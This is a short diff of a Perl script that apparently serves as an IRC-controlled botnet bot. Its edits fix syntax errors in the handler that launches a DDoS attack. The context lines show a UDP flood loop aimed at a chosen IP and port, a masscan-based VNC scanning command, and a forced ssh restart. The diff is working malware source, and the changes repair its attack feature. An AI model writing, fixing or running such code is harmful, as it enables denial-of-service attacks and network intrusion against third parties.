@@ -96,8 +96,8 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
     my @IRC_RESULTS;
     $events{connect}++;
             if ($msg = ~/@.ddos/) {
-            warn '"DDoS Launched on $1";
-            $irc - > write(notice => $noticechan => "[Info] DDoS Started");
+            warn "DDoS Launched on $1";
+            $irc -> write(notice => $noticechan => "[Info] DDoS Started");
             my($ip) = $1;
             my($port) = $2;
             my($size) = $3;
@@ -133,7 +133,7 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
               send(flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
               usleep(1000 * $delay) if $delay;
             }
-
+    
     elsif ($msg =~ /@.scan ([^\s]+)/) {
      $s->progress("[Info] Starting masscan... [VNC Scan in progress ...]");
      my $range = $1;
